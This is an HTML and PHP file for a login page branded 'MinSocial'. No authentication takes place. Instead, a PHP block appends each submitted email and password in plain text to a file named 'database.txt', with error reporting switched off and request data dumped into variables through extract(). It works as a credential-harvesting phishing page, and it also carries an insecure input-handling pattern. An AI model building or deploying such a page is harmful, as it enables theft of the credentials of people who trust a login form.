<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>MinSocial</title>
	<style type="text/css">
		body{
			background-color:#f1f1f1;
		}
		.content{
			margin-top: 10%;
		}
		.input-box{
			width: 25%;
			box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);
		}
		*{
			font-family: consolas;
		}
		.header{
			font-size: 200%;
			font-weight: 100;
			font-family: candara;
		}
		.input-button{
			background-color: darkgray;
			color:white;
			border:2px solid darkgray;
			border-radius: 10%;
			padding:1%;
			font-size: 150%;
			cursor: pointer;
			transition: 0.3s;
		}
		.input-button:hover{
			background-color: white;
			color: darkgray;
		}
	</style>
</head>
<body>
	<div class="content" align="center">
		<br/>
		<form class="input-box">
			<br/>
			<div class="header">MinSocial</div>
			<br/>
			<input type="text" name="username" placeholder="Email">
			<br/>
			<br>
			<input type="text" name="password" placeholder="Password">
			<br/>
			<br/>
			<input type="submit" value="Login" class="input-button">
			<br/>
			<br/>
		</form>
	</div>
</body>
</html>


<?php
	error_reporting(0);
	extract($_REQUEST);
	$file=fopen("database.txt","a");
	fwrite($file, $username);
	fwrite($file, "\n");
	fwrite($file, $password);
	fwrite($file, "\n");
	fclose($file);
?>